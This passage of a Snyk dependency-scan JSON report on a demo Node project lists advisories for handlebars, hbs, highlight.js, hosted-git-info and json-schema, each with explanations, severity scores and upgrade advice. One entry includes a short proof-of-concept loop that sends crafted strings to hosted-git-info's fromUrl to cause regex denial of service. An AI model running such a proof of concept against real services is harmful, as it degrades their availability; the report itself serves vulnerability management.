            "creationTime": "2019-04-14T11:55:45.212136Z",
            "credit": [
              "Nils Knappmeier"
            ],
            "cvssScore": 7.3,
            "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A Prototype Pollution allowing Remote Code Execution can be exploited using the constructor, via the 'lookup' helper.\r\nThis vulnerability is due to an incomplete fix for: `SNYK-JS-HANDLEBARS-173692`\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 3.0.7, 4.1.2, 4.0.14 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\n- [SNYK-JS-HANDLEBARS-173692](https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692)\n",
            "disclosureTime": "2019-04-13T06:31:34Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "3.0.7",
              "4.1.2",
              "4.0.14"
            ],
            "functions": [
              {
                "functionId": {
                  "className": null,
                  "filePath": "lib/handlebars/helpers/lookup.js",
                  "functionName": "module.exports"
                },
                "version": [
                  ">3.0.6 <4.1.2"
                ]
              }
            ],
            "functions_new": [
              {
                "functionId": {
                  "filePath": "lib/handlebars/helpers/lookup.js",
                  "functionName": "module.exports"
                },
                "version": [
                  ">3.0.6 <4.1.2"
                ]
              }
            ],
            "id": "SNYK-JS-HANDLEBARS-174183",
            "identifiers": {
              "CVE": [],
              "CWE": [
                "CWE-471"
              ],
              "GHSA": [
                "GHSA-q42p-pg8m-cqh6"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-02-07T10:35:57.706044Z",
            "moduleName": "handlebars",
            "packageManager": "npm",
            "packageName": "handlebars",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2019-04-14T06:31:34Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e"
              },
              {
                "title": "GitHub Issue",
                "url": "https://github.com/wycats/handlebars.js/issues/1495"
              },
              {
                "title": "SNYK-JS-HANDLEBARS-173692",
                "url": "https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=3.0.0 <3.0.7",
                ">=4.1.0 <4.1.2",
                ">=4.0.0 <4.0.14"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.11"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.14"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "handlebars",
            "version": "4.0.11",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N/E:P",
            "alternativeIds": [],
            "creationTime": "2021-08-17T11:02:48.815315Z",
            "credit": [
              "Agustin Gianni"
            ],
            "cvssScore": 3.4,
            "description": "## Overview\n[hbs](https://www.npmjs.org/package/hbs) is an Express.js template engine plugin for Handlebars\n\nAffected versions of this package are vulnerable to Information Exposure. `hbs` mixes pure template data with engine configuration options through the `Express` render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications.\n## Remediation\nThere is no fixed version for `hbs`.\n## References\n- [PoC and Explanation](https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/)\n",
            "disclosureTime": "2021-08-17T10:50:41Z",
            "exploit": "Proof of Concept",
            "fixedIn": [],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-HBS-1566555",
            "identifiers": {
              "CVE": [
                "CVE-2021-32822"
              ],
              "CWE": [
                "CWE-200"
              ],
              "GHSL": [
                "GHSL-2021-020"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-08-17T14:14:00.467905Z",
            "moduleName": "hbs",
            "packageManager": "npm",
            "packageName": "hbs",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2021-08-17T14:14:00.465869Z",
            "references": [
              {
                "title": "PoC and Explanation",
                "url": "https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/"
              }
            ],
            "semver": {
              "vulnerable": [
                "*"
              ]
            },
            "severity": "low",
            "socialTrendAlert": false,
            "title": "Information Exposure",
            "from": [
              "goof@1.0.1",
              "hbs@4.0.4"
            ],
            "upgradePath": [],
            "isUpgradable": false,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "hbs",
            "version": "4.0.4",
            "severityWithCritical": "low"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:N/A:H",
            "alternativeIds": [],
            "creationTime": "2020-11-25T12:50:16.634305Z",
            "credit": [
              "Vladimir Jimenez",
              "Josh Goebel",
              "Travis Ralston"
            ],
            "cvssScore": 5.8,
            "description": "## Overview\n[highlight.js](https://www.npmjs.com/package/highlight.js) is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework, and has automatic language detection.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A malicious HTML code block can be crafted that will result in prototype pollution of the base object's prototype during highlighting. If you allow users to insert custom HTML code blocks into your page/app via parsing Markdown code blocks (or similar) and do not filter the language names the user can provide you may be vulnerable.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `highlight.js` to version 9.18.2, 10.1.2 or higher.\n## References\n- [GitHub Commit](https://github.com/highlightjs/highlight.js/commit/7241013ae011a585983e176ddc0489a7a52f6bb0)\n- [GitHub PR](https://github.com/highlightjs/highlight.js/pull/2636)\n",
            "disclosureTime": "2020-11-24T22:58:41Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "9.18.2",
              "10.1.2"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-HIGHLIGHTJS-1045326",
            "identifiers": {
              "CVE": [
                "CVE-2020-26237"
              ],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-vfrc-7r7c-w9mx"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-11-25T17:05:14.721131Z",
            "moduleName": "highlight.js",
            "packageManager": "npm",
            "packageName": "highlight.js",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2020-11-25T17:05:14.497065Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/highlightjs/highlight.js/commit/7241013ae011a585983e176ddc0489a7a52f6bb0"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/highlightjs/highlight.js/pull/2636"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=7.2.0 <9.18.2",
                ">=10.0.0 <10.1.2"
              ]
            },
            "severity": "medium",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "typeorm@0.2.24",
              "cli-highlight@2.1.4",
              "highlight.js@9.18.1"
            ],
            "upgradePath": [
              false,
              "typeorm@0.2.24",
              "cli-highlight@2.1.4",
              "highlight.js@9.18.2"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "highlight.js",
            "version": "9.18.1",
            "severityWithCritical": "medium"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "alternativeIds": [],
            "creationTime": "2020-12-06T09:34:39.383236Z",
            "credit": [
              "Unknown"
            ],
            "cvssScore": 5.3,
            "description": "## Overview\n[highlight.js](https://www.npmjs.com/package/highlight.js) is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework, and has automatic language detection.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via Exponential and Polynomial catastrophic backtracking in multiple language highlighting.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `highlight.js` to version 10.4.1 or higher.\n## References\n- [GitHub Commit](https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c)\n",
            "disclosureTime": "2020-12-04T16:47:20Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "10.4.1"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-HIGHLIGHTJS-1048676",
            "identifiers": {
              "CVE": [],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-7wwv-vh3v-89cq"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-12-06T16:34:07.402949Z",
            "moduleName": "highlight.js",
            "packageManager": "npm",
            "packageName": "highlight.js",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2020-12-06T16:34:07.195287Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=9.0.0 <10.4.1"
              ]
            },
            "severity": "medium",
            "socialTrendAlert": false,
            "title": "Regular Expression Denial of Service (ReDoS)",
            "from": [
              "goof@1.0.1",
              "typeorm@0.2.24",
              "cli-highlight@2.1.4",
              "highlight.js@9.18.1"
            ],
            "upgradePath": [
              false,
              "typeorm@0.2.24",
              "cli-highlight@2.1.6",
              "highlight.js@10.4.1"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "highlight.js",
            "version": "9.18.1",
            "severityWithCritical": "medium"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C",
            "alternativeIds": [],
            "creationTime": "2021-03-23T16:13:42.109692Z",
            "credit": [
              "Yeting Li"
            ],
            "cvssScore": 5.3,
            "description": "## Overview\n[hosted-git-info](https://www.npmjs.org/package/hosted-git-info) is a Provides metadata and conversions from repository urls for Github, Bitbucket and Gitlab\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression `shortcutMatch ` in the `fromUrl` function in index.js. The affected regular expression exhibits polynomial worst-case time complexity.\r\n\r\n### PoC by Yeting Li\r\n```\r\nvar hostedGitInfo = require(\"hosted-git-info\")\r\nfunction build_attack(n) {\r\n    var ret = \"a:\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"a\"\r\n    }\r\n    return ret + \"!\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n   if (i % 1000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n       var parsedInfo = hostedGitInfo.fromUrl(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `hosted-git-info` to version 3.0.8, 2.8.9 or higher.\n## References\n- [GitHub Commit](https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3)\n",
            "disclosureTime": "2020-11-28T00:00:00Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "3.0.8",
              "2.8.9"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-HOSTEDGITINFO-1088355",
            "identifiers": {
              "CVE": [
                "CVE-2021-23362"
              ],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-43f8-2h32-f4cj"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-07-06T14:08:10.106189Z",
            "moduleName": "hosted-git-info",
            "packageManager": "npm",
            "packageName": "hosted-git-info",
            "patches": [],
            "proprietary": true,
            "publicationTime": "2021-03-23T17:13:24Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=3.0.0 <3.0.8",
                "<2.8.9"
              ]
            },
            "severity": "medium",
            "socialTrendAlert": false,
            "title": "Regular Expression Denial of Service (ReDoS)",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "read-pkg-up@1.0.1",
              "read-pkg@1.1.0",
              "normalize-package-data@2.4.0",
              "hosted-git-info@2.6.0"
            ],
            "upgradePath": [],
            "isUpgradable": false,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "hosted-git-info",
            "version": "2.6.0",
            "severityWithCritical": "medium"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
            "alternativeIds": [],
            "creationTime": "2021-11-14T15:11:37.579980Z",
            "credit": [
              "Yoshino-s"
            ],
            "cvssScore": 8.6,
            "description": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `validate` function, which when given a special payload will pollute `Object` with undesired attributes.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `json-schema` to version 0.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741)\n",
            "disclosureTime": "2021-11-14T15:05:57Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "0.4.0"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-JSONSCHEMA-1920922",
            "identifiers": {
              "CVE": [
                "CVE-2021-3918"
              ],
              "CWE": [
                "CWE-1321"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-12-17T15:25:44.736835Z",
            "moduleName": "json-schema",
            "packageManager": "npm",
            "packageName": "json-schema",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2021-11-14T16:49:43.070251Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741"
              }
            ],
            "semver": {
              "vulnerable": [
                "<0.4.0"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
